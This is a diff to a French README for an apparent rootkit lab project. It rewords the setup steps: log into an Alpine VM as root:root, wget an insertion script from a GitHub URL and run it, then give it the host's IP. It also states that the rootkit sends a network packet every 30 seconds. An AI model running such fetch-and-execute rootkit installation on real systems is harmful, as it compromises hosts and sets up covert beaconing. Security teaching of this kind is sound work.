@@ -6,9 +6,9 @@ Exécuter le script de lancement de l’Alpine
 ./script_generate_alpine_LFS.sh
 ```
 
-Se connecter avec les credentials `root:root`
+Se connecter à l'alpine avec les credentials `root:root`
 
-Récupérer le script d’insertion et l’exécuter
+Récupérer le script d’insertion et l’exécuter dans l'alpine
 
 ```c
 wget https://raw.githubusercontent.com/gobelinor/Rootkit-Project/refs/heads/main/mesmodules/insert/insertion_script
@@ -22,7 +22,7 @@ Depuis la machine hôte
 ip a
 ```
 
-récupérer l’IP de l’hôte et la renseigner au script d’insertion 
+Renseigner l'IP de l'hôte au script d’insertion 
 
 Un des processus de ce rootkit va envoyer un paquet réseau toutes les 30s.
 
